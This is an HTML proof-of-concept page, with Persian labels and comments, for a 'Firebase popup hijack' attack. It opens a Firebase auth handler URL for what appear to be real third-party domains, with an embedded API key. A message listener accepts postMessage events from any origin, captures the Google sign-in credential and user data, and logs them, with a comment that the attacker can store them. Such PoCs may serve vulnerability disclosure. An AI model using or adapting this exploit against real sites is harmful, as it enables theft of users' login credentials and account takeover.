<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>Firebase Popup Hijack PoC</title>
  <style>body { font-family: Arial; padding: 20px; }</style>
</head>
<body>

  <h2>Firebase Popup Hijack Attack</h2>
  <input type="text" id="handlerUrl" style="width: 90%; padding: 10px;" 
         value="https://iam.cldbt.cloud/__/auth/handler?apiKey=AIzaSyBno_U0VgS_Pl1ayb41cqKNL5wFtB5zLio&appName=%5BDEFAULT%5D&authType=signInViaPopup&redirectUrl=https%3A%2F%2Fwww.cloudgaming002.com%2Fen%2Fauth%2Fsign-in&providerId=google.com" />

  <br><br>
  <button onclick="openPopup()">باز کردن Popup از Origin Attacker</button>

  <h3>دریافتی‌ها (Auth Event):</h3>
  <pre id="log"></pre>

  <script>
    const logEl = document.getElementById('log');

    function log(msg) {
      const time = new Date().toLocaleTimeString('fa-IR');
      logEl.innerHTML += `<b>[${time}]</b> ${msg}<br>`;
      console.log(msg);
    }

    let popup = null;

    function openPopup() {
      const url = document.getElementById('handlerUrl').value;
      
      popup = window.open(
        url,
        "firebasePopup",
        "width=700,height=750,scrollbars=yes"
      );

      if (!popup) {
        log("❌ Popup مسدود شد! پاپ‌آپ بلاکر را خاموش کنید.");
        return;
      }

      log("✅ Popup از origin attacker باز شد");
    }

    // گوش دادن به همه postMessageها
    window.addEventListener('message', function(e) {
      log(`📨 پیام از: <b>${e.origin}</b>`);

      if (e.data && e.data.eventType) {
        log(`✅ eventType: <b>${e.data.eventType}</b>`);

        if (e.data.eventType === "sendAuthEvent") {
          log("🔥 <b>sendAuthEvent دریافت شد! (داده مهم)</b>");
          log("Credential: " + JSON.stringify(e.data.data.credential, null, 2));
          log("User: " + JSON.stringify(e.data.data.user, null, 2));
          
          // اینجا attacker می‌تواند credential را ذخیره کند
          console.log("=== ATTACK SUCCESS ===", e.data.data);
        }
      }
    });

    // چک کردن بسته شدن popup
    setInterval(() => {
      if (popup && popup.closed) {
        log("Popup بسته شد.");
        popup = null;
      }
    }, 1000);
  </script>
</body>
</html>
